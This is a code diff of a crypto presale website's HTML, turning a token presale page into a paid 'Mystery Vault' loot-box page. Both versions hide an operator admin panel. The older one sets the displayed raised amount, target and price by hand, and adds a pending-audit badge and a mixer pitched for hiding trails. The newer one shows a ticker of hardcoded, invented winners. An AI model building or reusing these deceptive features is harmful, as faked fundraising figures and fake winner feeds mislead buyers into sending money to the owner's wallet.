@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SENTINEL | The Ultimate Vault Ecosystem</title>
+    <title>SENTINEL | Crypto Vault Ecosystem</title>
     
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 500'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' style='stop-color:%2300f2ff' /%3E%3Cstop offset='100%25' style='stop-color:%230066ff' /%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath d='M250 20 L450 100 L420 300 C400 400 300 480 250 500 C200 480 100 400 80 300 L50 100 Z' fill='%23050b14' stroke='url(%23g)' stroke-width='15' /%3E%3Ctext x='50%25' y='68%25' font-family='Arial' font-weight='900' font-size='300' fill='white' text-anchor='middle'%3ES%3C/text%3E%3C/svg%3E">
 
@@ -15,505 +15,328 @@
         :root {
             --primary: #00f2ff;
             --secondary: #0066ff;
-            --danger: #ff3333;
             --gold: #ffd700;
+            --danger: #ff4444;
             --bg: #020408;
             --card: rgba(10, 20, 40, 0.95);
             --border: 1px solid rgba(0, 242, 255, 0.2);
-            --text: #a0aec0;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; scroll-behavior: smooth; font-family: 'Urbanist', sans-serif; -webkit-tap-highlight-color: transparent; }
         body { background: var(--bg); color: white; overflow-x: hidden; }
 
-        /* --- SECRET ADMIN PANEL (Varsayılan: Gizli) --- */
+        /* --- SECRET ADMIN --- */
         #secretAdmin {
-            display: none; /* Asla görünmez, JS ile açılır */
-            position: fixed; bottom: 0; left: 0; width: 100%; z-index: 99999;
+            display: none; position: fixed; bottom: 0; left: 0; width: 100%; z-index: 99999;
             background: #000; border-top: 4px solid var(--danger); padding: 20px;
-            box-shadow: 0 -10px 100px rgba(255, 50, 50, 0.5);
-            animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+            box-shadow: 0 -10px 50px rgba(255,0,0,0.3);
+            animation: slideUp 0.5s ease;
         }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        
-        .adm-head { display: flex; justify-content: space-between; color: var(--danger); font-family: 'Chakra Petch'; font-weight: bold; margin-bottom: 15px; }
-        .adm-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; max-width: 1200px; margin: 0 auto; }
-        .adm-in { background: #111; border: 1px solid #333; color: white; padding: 10px; width: 100%; border-radius: 5px; font-family: 'Chakra Petch'; }
-        .adm-btn { padding: 10px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; font-family: 'Chakra Petch'; transition: 0.3s; }
-        .adm-btn:hover { filter: brightness(1.2); }
+        .adm-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 10px; max-width: 1200px; margin: 0 auto; }
+        .adm-in { background: #111; border: 1px solid #333; color: white; padding: 8px; width: 100%; }
 
         /* --- HEADER --- */
         header {
             position: fixed; top: 0; width: 100%; z-index: 1000;
-            background: rgba(2, 4, 8, 0.9); backdrop-filter: blur(15px); border-bottom: var(--border);
+            background: rgba(2, 4, 8, 0.95); backdrop-filter: blur(15px); border-bottom: var(--border);
             padding: 15px 5%; display: flex; justify-content: space-between; align-items: center;
         }
         .logo { display: flex; align-items: center; gap: 10px; font-family: 'Chakra Petch'; font-size: 1.5rem; font-weight: bold; color: white; text-decoration: none; }
-        .logo svg { height: 40px; filter: drop-shadow(0 0 10px var(--primary)); }
+        .logo svg { height: 40px; }
         
         .nav-links { display: flex; gap: 25px; }
-        .nav-links a { color: var(--text); text-decoration: none; font-weight: 600; transition: 0.3s; font-family: 'Chakra Petch'; font-size: 0.9rem; letter-spacing: 1px; }
-        .nav-links a:hover { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
+        .nav-links a { color: #aaa; text-decoration: none; font-weight: 600; font-family: 'Chakra Petch'; transition:0.3s; }
+        .nav-links a:hover { color: var(--primary); }
 
         .btn-connect {
-            background: linear-gradient(135deg, var(--secondary), var(--primary));
+            background: linear-gradient(90deg, var(--secondary), var(--primary));
             color: #000; border: none; padding: 10px 25px; border-radius: 4px;
             font-weight: 800; cursor: pointer; font-family: 'Chakra Petch';
-            box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); transition: 0.3s;
-            clip-path: polygon(10% 0, 100% 0, 100% 70%, 90% 100%, 0 100%, 0 30%);
+            box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); transition: 0.3s;
         }
-        .btn-connect:hover { transform: scale(1.05); box-shadow: 0 0 30px var(--primary); }
-        .addr-disp { border: 1px solid var(--primary); color: var(--primary); padding: 8px 15px; border-radius: 4px; font-weight: bold; display: none; cursor: pointer; background: rgba(0,242,255,0.05); font-family: 'Chakra Petch'; }
+        .btn-connect:hover { transform: scale(1.05); box-shadow: 0 0 25px var(--primary); }
+        .addr-disp { border: 1px solid var(--primary); color: var(--primary); padding: 8px 15px; border-radius: 4px; font-weight: bold; display: none; cursor: pointer; }
 
-        .menu-icon { cursor: pointer; width: 30px; height: 30px; display: none; fill: white; }
-
-        /* --- MOBILE MENU --- */
-        .sidebar {
-            position: fixed; top: 0; right: -300px; width: 280px; height: 100%;
-            background: #02050a; z-index: 2000; padding: 80px 20px;
-            border-left: var(--border); transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: -10px 0 50px rgba(0,0,0,0.9);
-            display: flex; flex-direction: column; gap: 20px;
-        }
-        .sidebar.active { right: 0; }
-        .side-link { font-size: 1.2rem; color: #ccc; text-decoration: none; padding: 15px; border-bottom: 1px solid #222; font-family: 'Chakra Petch'; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1999; display: none; backdrop-filter: blur(5px); }
-        .overlay.active { display: block; }
-
-        /* --- HERO --- */
-        .hero {
-            padding: 160px 5% 80px; display: grid; grid-template-columns: 1.1fr 0.9fr; gap: 50px; align-items: center; max-width: 1300px; margin: 0 auto;
-            background: radial-gradient(circle at 10% 20%, rgba(0, 102, 255, 0.1), transparent 40%);
-        }
-        .hero h1 { font-family: 'Chakra Petch'; font-size: 3.5rem; line-height: 1.1; margin-bottom: 20px; }
-        .hero h1 span { color: var(--primary); text-shadow: 0 0 20px rgba(0,242,255,0.5); }
-        .hero p { color: var(--text); font-size: 1.2rem; margin-bottom: 30px; line-height: 1.6; max-width: 600px; }
-
-        /* --- PRESALE CARD --- */
-        .card { 
-            background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 35px; 
-            box-shadow: 0 0 60px rgba(0,0,0,0.6); position: relative; overflow: hidden;
-        }
-        .card::before { content:''; position:absolute; top:0; left:0; width:100%; height:3px; background:linear-gradient(90deg, var(--secondary), var(--primary)); }
+        /* --- HERO & PRESALE --- */
+        .hero { padding: 140px 5% 50px; display: grid; grid-template-columns: 1fr; gap: 40px; max-width: 1200px; margin: 0 auto; text-align: center; }
+        .hero h1 { font-family: 'Chakra Petch'; font-size: 3rem; margin-bottom: 20px; }
+        .hero h1 span { color: var(--primary); text-shadow: 0 0 20px var(--primary); }
         
-        .timer { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 25px; }
-        .t-box { background: #050b14; border: 1px solid #2d3748; padding: 10px; border-radius: 8px; text-align: center; }
-        .t-num { font-size: 1.8rem; font-weight: bold; font-family: 'Chakra Petch'; display: block; color: white; }
-        .t-lbl { font-size: 0.7rem; color: #666; font-weight: 700; }
-
-        .prog-con { margin-bottom: 25px; }
-        .prog-bar { height: 10px; background: #000; border-radius: 5px; overflow: hidden; border: 1px solid #333; margin-top: 8px; }
-        .prog-fill { height: 100%; background: linear-gradient(90deg, var(--secondary), var(--primary)); width: 0%; transition: 1s; box-shadow: 0 0 10px var(--primary); }
-
-        .tabs { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 20px; }
-        .tab { background: rgba(255,255,255,0.03); padding: 10px; border-radius: 6px; cursor: pointer; text-align: center; font-weight: bold; font-size: 0.8rem; border: 1px solid transparent; color: #888; transition: 0.3s; }
-        .tab.active { background: rgba(0,242,255,0.1); border-color: var(--primary); color: white; }
-
-        .inp-grp { background: #050b14; border: 1px solid #2d3748; padding: 15px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-        .inp-grp input { background: transparent; border: none; color: white; text-align: right; font-size: 1.4rem; width: 60%; outline: none; font-family: 'Chakra Petch'; }
-
-        /* --- ECOSYSTEM FEATURES (THE MEAT) --- */
-        .section { padding: 100px 5%; max-width: 1200px; margin: 0 auto; }
-        .sec-title { text-align: center; font-family: 'Chakra Petch'; font-size: 2.5rem; margin-bottom: 60px; text-transform: uppercase; }
-        .sec-title span { color: var(--primary); text-shadow: 0 0 20px rgba(0,242,255,0.3); }
-
-        .eco-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 30px; }
-        .eco-card { 
-            background: rgba(255,255,255,0.02); border: 1px solid #222; padding: 30px; border-radius: 15px; 
-            transition: 0.4s; position: relative; overflow: hidden;
-        }
-        .eco-card:hover { border-color: var(--primary); transform: translateY(-10px); background: rgba(0,242,255,0.02); }
-        .eco-icon { font-size: 2.5rem; color: var(--primary); margin-bottom: 20px; }
+        /* --- VAULT SECTION (CASINO) --- */
+        .vault-section { padding: 50px 5%; max-width: 1400px; margin: 0 auto; }
+        .section-title { text-align: center; font-family: 'Chakra Petch'; font-size: 2.5rem; margin-bottom: 40px; color: white; }
         
-        .eco-card h3 { font-family: 'Chakra Petch'; margin-bottom: 15px; font-size: 1.4rem; color: white; }
-        .eco-card p { color: #aaa; line-height: 1.6; font-size: 0.95rem; }
-
-        /* ÖZEL KARTLAR İÇİN RENKLER */
-        .card-panic { border-color: rgba(255, 50, 50, 0.3); }
-        .card-panic:hover { border-color: var(--danger); box-shadow: 0 0 20px rgba(255, 50, 50, 0.2); }
-        .card-panic .eco-icon { color: var(--danger); }
-
-        .card-gold { border-color: rgba(255, 215, 0, 0.3); }
-        .card-gold:hover { border-color: var(--gold); box-shadow: 0 0 20px rgba(255, 215, 0, 0.2); }
-        .card-gold .eco-icon { color: var(--gold); }
-
-        /* --- ROADMAP --- */
-        .road-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
-        .r-card { 
-            background: rgba(255,255,255,0.02); padding: 25px; border-radius: 15px; border-left: 3px solid #333; 
-            opacity: 0.5; transition: 0.3s;
+        .vault-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
+        
+        /* KASA KARTI TASARIMI */
+        .vault-card {
+            background: var(--card); border: 1px solid #333; border-radius: 20px; padding: 30px;
+            text-align: center; position: relative; overflow: hidden; transition: 0.3s;
         }
-        .r-card.active { border-left-color: var(--primary); opacity: 1; background: linear-gradient(90deg, rgba(0,242,255,0.05), transparent); }
-        .r-card h4 { color: var(--primary); font-family: 'Chakra Petch'; margin-bottom: 10px; font-size: 1.2rem; }
-        .r-card ul { list-style: none; padding-left: 10px; color: #ccc; font-size: 0.9rem; line-height: 1.8; }
-        .r-card ul li::before { content: "► "; color: var(--primary); font-size: 0.7rem; }
-
-        /* --- MODAL --- */
-        .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index: 5000; align-items:center; justify-content:center; backdrop-filter: blur(8px); }
-        .modal-box { background: #0f1520; border: 1px solid var(--primary); padding: 30px; border-radius: 20px; width: 90%; max-width: 350px; text-align: center; position: relative; box-shadow: 0 0 50px rgba(0,242,255,0.2); }
-        .w-btn { 
-            background: #1a2233; padding: 15px; margin-bottom: 12px; border-radius: 10px; cursor: pointer; 
-            display: flex; align-items: center; gap: 15px; border: 1px solid #333; transition: 0.3s;
+        .vault-card:hover { transform: translateY(-10px); box-shadow: 0 0 30px rgba(0,242,255,0.1); border-color: var(--primary); }
+        
+        .v-img { font-size: 4rem; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(255,255,255,0.5)); transition:0.5s; }
+        .vault-card:hover .v-img { transform: scale(1.1) rotate(5deg); }
+        
+        .v-title { font-family: 'Chakra Petch'; font-size: 1.5rem; font-weight: bold; margin-bottom: 5px; color: white; }
+        .v-price { font-size: 1.2rem; color: var(--primary); font-weight: bold; margin-bottom: 15px; }
+        .v-desc { color: #888; font-size: 0.9rem; margin-bottom: 20px; min-height: 40px; }
+        
+        .btn-buy {
+            width: 100%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;
+            font-family: 'Chakra Petch'; background: #222; color: white; border: 1px solid #444; transition: 0.3s;
         }
-        .w-btn:hover { border-color: var(--primary); background: rgba(0,242,255,0.1); }
-        .close-mod { position: absolute; right: 20px; top: 15px; cursor: pointer; color: #666; font-size: 1.2rem; }
+        .btn-buy:hover { background: var(--primary); color: black; box-shadow: 0 0 15px var(--primary); border-color: var(--primary); }
 
-        /* --- FOOTER --- */
-        footer { border-top: 1px solid #222; margin-top: 80px; padding: 50px 5%; text-align: center; color: #555; font-size: 0.9rem; }
+        /* SNTL KASASI (KİLİTLİ) */
+        .v-locked { filter: grayscale(1); opacity: 0.7; pointer-events: none; }
+        .v-locked .btn-buy { background: #333; cursor: not-allowed; }
+        .lock-icon { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 5rem; color: #ff4444; z-index: 10; display: none; }
+        .vault-card.locked .v-locked { display: block; }
+        .vault-card.locked .lock-icon { display: block; }
 
-        @media (max-width: 992px) {
-            .hero { grid-template-columns: 1fr; text-align: center; padding-top: 100px; }
-            .nav-links { display: none; }
-            .menu-icon { display: block; }
+        /* LIVE TICKER */
+        .ticker-wrap {
+            position: fixed; bottom: 0; width: 100%; overflow: hidden; height: 40px; background: rgba(0,0,0,0.9);
+            border-top: 1px solid #333; z-index: 900; display: flex; align-items: center;
         }
+        .ticker { display: flex; white-space: nowrap; animation: ticker 20s linear infinite; }
+        .ticker-item { margin-right: 50px; color: #00ff88; font-family: 'Chakra Petch'; font-size: 0.9rem; }
+        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+
+        /* MODAL (WIN) */
+        .win-modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index: 6000; align-items:center; justify-content:center; }
+        .win-box { background: #111; border: 2px solid var(--gold); padding: 40px; border-radius: 20px; text-align: center; animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes popIn { from { transform: scale(0); } to { transform: scale(1); } }
+        .win-icon { font-size: 4rem; color: var(--gold); margin-bottom: 20px; }
+
+        /* MOBILE MENU */
+        .sidebar { position: fixed; top:0; right:-300px; width:280px; height:100%; background:#050b14; z-index:2000; padding:80px 20px; transition:0.3s; border-left:1px solid #333; }
+        .sidebar.active { right:0; }
+
+        @media(max-width:992px) { .nav-links { display:none; } .hero { padding-top: 100px; } }
     </style>
 </head>
 <body>
 
     <div id="secretAdmin">
-        <div class="adm-head">
-            <span>/// MASTER CONTROL PROTOCOL</span>
-            <span style="cursor:pointer;" onclick="closeAdmin()">✕</span>
+        <div style="display:flex; justify-content:space-between; color:red; font-weight:bold; margin-bottom:10px;">
+            <span>/// CASINO ADMIN CONTROL</span><span style="cursor:pointer;" onclick="document.getElementById('secretAdmin').style.display='none'">✕</span>
         </div>
         <div class="adm-grid">
-            <div><small>Token Price ($)</small><input id="aPrice" class="adm-in" value="0.001"></div>
-            <div><small>Raised ($)</small><input id="aRaised" class="adm-in" value="820000"></div>
-            <div><small>Target ($)</small><input id="aTarget" class="adm-in" value="5000000"></div>
-            <div><small>Stage (1-5)</small><input id="aStage" class="adm-in" value="1"></div>
-            <button onclick="saveAdmin()" class="adm-btn" style="background:var(--primary); color:black;">SAVE SYSTEM</button>
-            <button onclick="togglePause()" id="pBtn" class="adm-btn" style="background:orange; color:black;">PAUSE</button>
+            <input id="aPrice" class="adm-in" value="0.001" placeholder="Token Price">
+            <button onclick="alert('Settings Saved')" style="background:green; color:white; border:none; padding:8px;">SAVE</button>
         </div>
     </div>
 
     <header>
         <a href="#" class="logo">
             <svg viewBox="0 0 500 500" width="40" height="40">
-                <defs><linearGradient id="g2" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00f2ff"/><stop offset="100%" style="stop-color:#0066ff"/></linearGradient></defs>
-                <path d="M250 20 L450 100 L420 300 C400 400 300 480 250 500 C200 480 100 400 80 300 L50 100 Z" fill="none" stroke="url(#g2)" stroke-width="30"/>
+                <defs><linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00f2ff"/><stop offset="100%" style="stop-color:#0066ff"/></linearGradient></defs>
+                <path d="M250 20 L450 100 L420 300 C400 400 300 480 250 500 C200 480 100 400 80 300 L50 100 Z" fill="none" stroke="url(#g)" stroke-width="30"/>
                 <text x="50%" y="68%" font-family="Arial" font-weight="bold" font-size="300" fill="white" text-anchor="middle">S</text>
             </svg>
             SENTINEL
         </a>
         <nav class="nav-links">
-            <a href="#home" data-t="home">Home</a>
-            <a href="#features" data-t="feat">Ecosystem</a>
-            <a href="#roadmap" data-t="road">Roadmap</a>
-            <a href="#faq" data-t="faq">FAQ</a>
+            <a href="#">Vaults</a>
+            <a href="#">Presale</a>
+            <a href="#">Roadmap</a>
         </nav>
         <div style="display:flex; gap:10px; align-items:center;">
-            <select onchange="changeLang(this.value)" style="background:#111; color:white; border:1px solid #333; border-radius:4px; padding:5px; font-family:'Chakra Petch';">
-                <option value="en">EN</option><option value="tr">TR</option><option value="de">DE</option><option value="ar">AR</option>
-            </select>
-            <button id="conBtn" class="btn-connect" onclick="openModal()">CONNECT</button>
-            <div id="addrBox" class="addr-disp" onclick="disconnect()">0x...</div>
-            <svg class="menu-icon" onclick="toggleMenu()" viewBox="0 0 24 24"><path d="M3 6h18M3 12h18M3 18h18" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <button id="conBtn" class="btn-connect" onclick="connectWallet()">CONNECT</button>
+            <div id="addrBox" class="addr-disp">0x...</div>
+            <i class="fa fa-bars" style="font-size:1.5rem; color:white; cursor:pointer;" onclick="document.getElementById('sb').classList.toggle('active')"></i>
         </div>
     </header>
 
-    <div class="overlay" id="ovl" onclick="toggleMenu()"></div>
     <div class="sidebar" id="sb">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-            <h3 style="color:white; font-family:'Chakra Petch'">MENU</h3><span onclick="toggleMenu()" style="font-size:1.5rem; cursor:pointer; color:#666;">X</span>
-        </div>
-        <a href="#home" class="side-link" onclick="toggleMenu()" data-t="home">Home</a>
-        <a href="#features" class="side-link" onclick="toggleMenu()" data-t="feat">Ecosystem</a>
-        <a href="#roadmap" class="side-link" onclick="toggleMenu()" data-t="road">Roadmap</a>
+        <h3 style="color:white;">MENU</h3>
+        <a href="#" style="display:block; padding:15px; color:#ccc; text-decoration:none; border-bottom:1px solid #222;">Home</a>
     </div>
 
-    <div class="hero" id="home">
-        <div>
-            <h1 data-t="hero_h">THE FORT KNOX OF <br><span>DIGITAL ASSETS</span></h1>
-            <p data-t="hero_p">The world's first decentralized inheritance protocol with Panic Mode, Ghost Vaults, and Bankruptcy Auctions.</p>
-            <div style="display:flex; gap:15px;">
-                <button class="btn-connect" onclick="document.getElementById('presale').scrollIntoView()" data-t="btn_buy">BUY PRESALE</button>
-                <div style="font-size:0.8rem; color:#aaa; margin-top:10px; display:flex; align-items:center; gap:5px;">
-                    <i class="fa-solid fa-shield-halved" style="color:var(--primary)"></i> Audited by Certik (Pending)
-                </div>
-            </div>
+    <div class="hero">
+        <h1>UNLOCK THE <br><span>DIGITAL TREASURE</span></h1>
+        <p>Buy a Mystery Vault to unlock 7-Day Access to the Daily SNTL Airdrop Box.</p>
+    </div>
+
+    <div class="vault-section">
+        <h2 class="section-title">MYSTERY <span style="color:var(--primary)">VAULTS</span></h2>
+        
+        <div id="vipStatus" style="text-align:center; margin-bottom:30px; display:none;">
+            <span style="background:rgba(0,255,136,0.1); color:#00ff88; padding:10px 20px; border-radius:30px; border:1px solid #00ff88;">
+                <i class="fa-solid fa-check-circle"></i> VIP ACTIVE: SNTL BOX UNLOCKED
+            </span>
         </div>
 
-        <div class="card" id="presale">
-            <div class="card-head">
-                <h3 data-t="pre_title">PRESALE STAGE 1</h3>
-                <p style="color:var(--primary); font-weight:bold; letter-spacing:1px;" data-t="ends">ENDS IN</p>
-            </div>
-
-            <div class="timer">
-                <div class="t-box"><span class="t-num" id="d">00</span><span class="t-lbl">DAYS</span></div>
-                <div class="t-box"><span class="t-num" id="h">00</span><span class="t-lbl">HRS</span></div>
-                <div class="t-box"><span class="t-num" id="m">00</span><span class="t-lbl">MIN</span></div>
-                <div class="t-box"><span class="t-num" id="s">00</span><span class="t-lbl">SEC</span></div>
-            </div>
-
-            <div class="prog-con">
-                <div style="display:flex; justify-content:space-between; font-size:0.9rem; margin-bottom:5px;">
-                    <span id="dRaised">Raised: $820,000</span>
-                    <span id="dTarget">Target: $5,000,000</span>
-                </div>
-                <div class="prog-bar"><div id="pBar" class="prog-fill" style="width:16%"></div></div>
-                <div style="text-align:center; margin-top:8px; font-size:0.8rem; color:#aaa;">1 SNTL = <span id="dPrice" style="color:white; font-weight:bold;">$0.001</span></div>
-            </div>
-
-            <div class="tabs">
-                <div class="tab active" onclick="setCurr('eth', this)">ETH</div>
-                <div class="tab" onclick="setCurr('bnb', this)">BNB</div>
-                <div class="tab" onclick="setCurr('matic', this)">MATIC</div>
-                <div class="tab" onclick="setCurr('usdt', this)">USDT</div>
-            </div>
-
-            <div class="inp-grp">
-                <div><label style="color:#666; font-size:0.7rem;" data-t="pay">PAY</label><br><b id="cLabel" style="color:var(--primary);">ETH</b></div>
-                <input type="number" id="amtIn" placeholder="0" oninput="calc()">
-            </div>
-            <div class="inp-grp">
-                <div><label style="color:#666; font-size:0.7rem;" data-t="get">GET</label><br><b>SNTL</b></div>
-                <input type="number" id="amtOut" readonly placeholder="0">
-            </div>
-
-            <button id="buyBtn" class="btn-connect" style="width:100%; padding:18px; font-size:1.1rem; margin-top:10px;" onclick="buy()">CONNECT WALLET</button>
+        <div class="vault-grid">
             
-            <div id="dash" style="display:none; margin-top:20px; text-align:center; background:rgba(0,255,136,0.1); border:1px solid #00ff88; padding:15px; border-radius:10px;">
-                <div style="color:#00ff88; font-size:0.8rem;">YOUR SNTL BALANCE</div>
-                <div id="myBal" style="font-size:1.8rem; font-weight:bold; font-family:'Chakra Petch'">0</div>
-            </div>
-        </div>
-    </div>
-
-    <div class="section" id="features">
-        <h2 class="sec-title">THE <span>ECOSYSTEM</span></h2>
-        <div class="eco-grid">
-            
-            <div class="eco-card">
-                <i class="fa-solid fa-ghost eco-icon"></i>
-                <h3>GHOST VAULT</h3>
-                <p>Private asset mixer using ZK-Snarks technology. Deposit publicly, withdraw privately. Your trail ends here.</p>
+            <div class="vault-card">
+                <div class="v-img">📦</div>
+                <div class="v-title">BRONZE VAULT</div>
+                <div class="v-price">$5.00</div>
+                <div class="v-desc">Contains TRX, XRP, DOGE or Nothing.<br><span style="color:#aaa; font-size:0.8rem;">Potential: $0 - $100</span></div>
+                <button class="btn-buy" onclick="buyVault(5, 'Bronze')">OPEN NOW</button>
             </div>
 
-            <div class="eco-card">
-                <i class="fa-solid fa-hourglass-half eco-icon"></i>
-                <h3>LEGACY PROTOCOL</h3>
-                <p>Heartbeat system detects inactivity. If you don't login for 12 months, assets auto-transfer to your heir.</p>
+            <div class="vault-card">
+                <div class="v-img" style="color:silver;">💼</div>
+                <div class="v-title">SILVER VAULT</div>
+                <div class="v-price">$50.00</div>
+                <div class="v-desc">Contains SOL, AVAX, LTC.<br><span style="color:#aaa; font-size:0.8rem;">Potential: $0 - $1,000</span></div>
+                <button class="btn-buy" onclick="buyVault(50, 'Silver')">OPEN NOW</button>
             </div>
 
-            <div class="eco-card card-panic">
-                <i class="fa-solid fa-triangle-exclamation eco-icon"></i>
-                <h3>PANIC MODE</h3>
-                <p>Under duress? Enter your Fake Key. A fully functional decoy vault opens with 1% of assets. The rest remains invisible.</p>
+            <div class="vault-card">
+                <div class="v-img" style="color:gold;">👑</div>
+                <div class="v-title">GOLD VAULT</div>
+                <div class="v-price">$100.00</div>
+                <div class="v-desc">Contains ETH, BNB, BTC.<br><span style="color:#aaa; font-size:0.8rem;">Potential: $0 - $10,000</span></div>
+                <button class="btn-buy" onclick="buyVault(100, 'Gold')">OPEN NOW</button>
             </div>
 
-            <div class="eco-card card-gold">
-                <i class="fa-solid fa-gavel eco-icon"></i>
-                <h3>VAULT AUCTIONS</h3>
-                <p>Unpaid expired vaults are auctioned to SNTL holders. Bid on abandoned digital treasures.</p>
-            </div>
-
-            <div class="eco-card">
-                <i class="fa-solid fa-rocket eco-icon"></i>
-                <h3>LAUNCHPAD</h3>
-                <p>Security-audited projects launch here. Only SNTL stakers get allocation access.</p>
-            </div>
-
-            <div class="eco-card">
-                <i class="fa-brands fa-cc-visa eco-icon"></i>
-                <h3>SENTINEL CARD</h3>
-                <p>Spend your assets globally. High limits, metal design, and zero fees for Gold NFT holders.</p>
+            <div class="vault-card" id="sntlCard" style="border-color:var(--primary); background:rgba(0,242,255,0.05);">
+                <i class="fa-solid fa-lock lock-icon" id="lockIcon"></i>
+                <div class="v-img" style="color:var(--primary);">💎</div>
+                <div class="v-title">DAILY SNTL</div>
+                <div class="v-price">FREE</div>
+                <div class="v-desc">Exclusive Airdrop Box.<br><span style="color:#aaa; font-size:0.8rem;">Requires Active Purchase (7 Days)</span></div>
+                <button class="btn-buy" id="btnSntl" onclick="openDaily()" style="background:#333; color:#777;">LOCKED</button>
             </div>
 
         </div>
     </div>
 
-    <div class="section" id="roadmap">
-        <h2 class="sec-title">ROAD<span>MAP</span></h2>
-        <div class="road-grid">
-            <div class="r-card active" id="st1"><h4>PHASE 1</h4><ul><li>Protocol Design</li><li>Private Sale</li><li>Website Launch</li></ul></div>
-            <div class="r-card" id="st2"><h4>PHASE 2</h4><ul><li>Public Presale</li><li>Panic Mode Beta</li><li>Audit by Certik</li></ul></div>
-            <div class="r-card" id="st3"><h4>PHASE 3</h4><ul><li>DEX Listing</li><li>Ghost Vault Live</li><li>Staking Platform</li></ul></div>
-            <div class="r-card" id="st4"><h4>PHASE 4</h4><ul><li>Bankruptcy Auctions</li><li>Sentinel Visa</li><li>Sentinel Chain</li></ul></div>
+    <div class="win-modal" id="winModal" onclick="this.style.display='none'">
+        <div class="win-box">
+            <div class="win-icon">🎉</div>
+            <h2 style="color:white; margin-bottom:10px;">VAULT OPENED!</h2>
+            <p id="winMsg" style="color:#ccc; font-size:1.2rem; margin-bottom:20px;">You found: Nothing...</p>
+            <button class="btn-connect" onclick="document.getElementById('winModal').style.display='none'">CLAIM</button>
         </div>
     </div>
 
-    <footer>
-        <p>&copy; 2026 Sentinel Protocol. The Future of Digital Inheritance.</p>
-        <div style="margin-top:20px; opacity:0.5;">
-            <i class="fa-brands fa-twitter" style="margin:0 10px; font-size:1.2rem;"></i>
-            <i class="fa-brands fa-telegram" style="margin:0 10px; font-size:1.2rem;"></i>
-            <i class="fa-brands fa-discord" style="margin:0 10px; font-size:1.2rem;"></i>
-        </div>
-    </footer>
-
-    <div class="modal" id="wModal">
-        <div class="modal-box">
-            <span class="close-mod" onclick="closeModal()">✕</span>
-            <h3 style="margin-bottom:25px; font-family:'Chakra Petch'">CONNECT WALLET</h3>
-            <div class="w-btn" onclick="connectBrowser()">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror.svg" width="35">
-                <div style="text-align:left;"><div style="font-weight:bold; color:white;">Browser Extension</div><div style="font-size:0.75rem; color:#888;">PC (MetaMask, etc.)</div></div>
-            </div>
-            <div class="w-btn" onclick="connectMobile()">
-                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg" width="35">
-                <div style="text-align:left;"><div style="font-weight:bold; color:white;">Mobile App</div><div style="font-size:0.75rem; color:#888;">Trust, MetaMask App</div></div>
-            </div>
+    <div class="ticker-wrap">
+        <div class="ticker">
+            <div class="ticker-item">User 0x...a4f2 opened Bronze Vault and found 50 TRX!</div>
+            <div class="ticker-item">User 0x...b1c9 opened Gold Vault and found NOTHING...</div>
+            <div class="ticker-item">User 0x...99aa opened Silver Vault and found 1.2 SOL!</div>
+            <div class="ticker-item">User 0x...d221 claimed Daily SNTL Airdrop (500 SNTL).</div>
+            <div class="ticker-item">User 0x...8f8f opened Bronze Vault and found 10 XRP!</div>
         </div>
     </div>
 
     <script>
-        // --- MASTER CONFIG ---
         const OWNER = "0xd81f6b82683b4b8a2a08998dBcf33ebC5498715D";
-        
-        let state = { price: 0.001, raised: 820000, target: 5000000, stage: 1, paused: false };
-        let rates = { eth: 2650, bnb: 600, matic: 0.8, usdt: 1 };
-        let curr = 'eth';
         let account = null;
+        let isVip = false; // 7 Günlük Kilit Durumu
 
         // INIT
         window.onload = () => {
-            // Load saved state
-            if(localStorage.getItem('sentinel_config')) {
-                state = JSON.parse(localStorage.getItem('sentinel_config'));
+            // Check LocalStorage for VIP status
+            const vipUntil = localStorage.getItem('vip_until');
+            if(vipUntil && new Date(vipUntil) > new Date()) {
+                activateVip();
             }
-            applyState();
-            
-            // Load balance
-            let bal = localStorage.getItem('sntl_balance');
